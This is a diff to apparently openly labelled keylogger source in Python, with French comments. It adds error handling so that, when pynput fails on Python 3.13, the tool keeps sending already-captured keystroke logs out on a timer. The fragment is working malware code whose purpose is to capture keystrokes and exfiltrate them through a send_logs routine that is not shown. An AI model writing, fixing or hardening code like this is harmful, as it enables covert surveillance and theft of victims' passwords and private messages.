@@ -360,13 +360,32 @@ class Keylogger:
         
         try:
             # Écouter les frappes
-            with keyboard.Listener(on_press=self.on_press) as listener:
+            with keyboard.Listener(on_press=self.on_press, suppress=False) as listener:
                 listener.join()
         
         except KeyboardInterrupt:
             print("\n[!] Arrêt du keylogger...")
             self.stop_capture()
             print("[+] Keylogger arrêté")
+        except Exception as e:
+            # Gérer les erreurs de pynput (notamment avec Python 3.13)
+            if "ThreadHandle" in str(e) or "not callable" in str(e):
+                print(f"[!] Erreur connue avec pynput/Python 3.13: {e}")
+                print("[!] Solution: Utilisez Python 3.12 ou 3.11")
+                print("[!] Le keylogger continue en mode dégradé...")
+                # Continuer à envoyer les logs déjà capturés
+                while True:
+                    time.sleep(config.SEND_INTERVAL)
+                    if not self.capturing:
+                        break
+                    logs_to_send = []
+                    while not self.log_queue.empty():
+                        logs_to_send.append(self.log_queue.get())
+                    if logs_to_send:
+                        self.send_logs(logs_to_send)
+            else:
+                print(f"[-] Erreur inattendue: {e}")
+                self.stop_capture()
 
 
 if __name__ == "__main__":
